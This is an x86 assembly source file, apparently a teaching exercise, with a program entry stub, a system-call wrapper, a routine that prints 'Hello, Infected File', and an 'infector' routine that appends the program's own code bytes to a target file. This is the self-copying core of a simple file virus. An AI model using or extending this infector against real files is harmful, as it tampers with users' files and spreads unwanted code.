section .rodata
    hello db 'Hello, Infected File',0xA ; define the string to be printed and add linefeed character
section .text
global _start
global system_call
global infection
global infector
extern main
code_start:
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infection:
    mov     eax, 4          ; system call for write
    mov     ebx, 1          ; file descriptor for stdout
    mov     ecx, hello      ; address of the string to be printed
    mov     edx, 21         ; length of the string
    int     0x80            ; invoke system call
    ret
infector:
    open_for_append:
        mov     eax, 5              ;system open
        mov     ebx, dword[esp+4]   ;when calling a function, the argumented are pushed then the return address is pushed, so we have push name, then push return address
        mov     ecx, 2000o          ;APPEND
        or      ecx, 1              ;APPEND | write
        int     0x80
        cmp     eax, 0
        jle exit_program
    write_virus:
        mov     ebx, eax
        mov     eax, 4              ;system write
        mov     ecx, code_start
        mov     edx, code_end - code_start
        int     0x80
    close_file:
        mov     eax, 6
        int     0x80
    exit_program:
    ret
code_end: